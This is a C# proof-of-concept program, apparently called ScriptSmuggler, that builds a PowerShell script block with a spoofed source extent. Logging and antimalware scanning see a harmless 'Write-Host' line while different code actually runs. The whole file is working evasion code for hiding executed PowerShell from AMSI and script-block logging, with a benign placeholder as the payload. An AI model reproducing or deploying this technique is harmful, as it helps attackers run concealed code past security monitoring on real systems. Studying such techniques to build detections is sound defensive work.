using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Language;
using System.Management.Automation.Runspaces;


namespace ScriptSmuggler
{
    public class Program
    {
        public static void Main()
        {
            string script = @"Write-Output 'amsicontext'";
            ScriptBlock sb = BuildSpoofedBlock(script);
            // Setup PowerShell runspace
            using (Runspace runSpace = RunspaceFactory.CreateRunspace())
            {
                runSpace.Open();
                using (PowerShell ps = PowerShell.Create())
                {
                    ps.Runspace = runSpace;




                    ps.AddCommand("Invoke-Command")
                      .AddParameter("ScriptBlock", sb);

                    Collection<PSObject> results = ps.Invoke();
                    foreach (PSObject result in results)
                    {
                        Console.WriteLine(result);
                    }

                    // Display any errors from the error stream
                    foreach (ErrorRecord error in ps.Streams.Error)
                    {
                        Console.WriteLine("ERROR: " + error);
                    }
                }
            }
        }



        public static ScriptBlock BuildSpoofedBlock(string content)
        {
            try
            {
                // Create spoofed and executable ASTs
                ScriptBlockAst spoofExtentAst = (ScriptBlockAst)ScriptBlock.Create("Write-Host 'Hello'").Ast;
                ScriptBlockAst executableAst = (ScriptBlockAst)ScriptBlock.Create(content).Ast;

                // Combine them into a new AST with a spoofed extent
                ScriptBlockAst newAst = new ScriptBlockAst(
                    spoofExtentAst.Extent,
                    null,
                    null,
                    null,
                    (NamedBlockAst)executableAst.EndBlock.Copy(),
                    null
                );

                // Return the new script block from the AST
                return newAst.GetScriptBlock();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception in BuildSpoofedBlock: " + ex.Message);
                return null;
            }
        }
    }
}
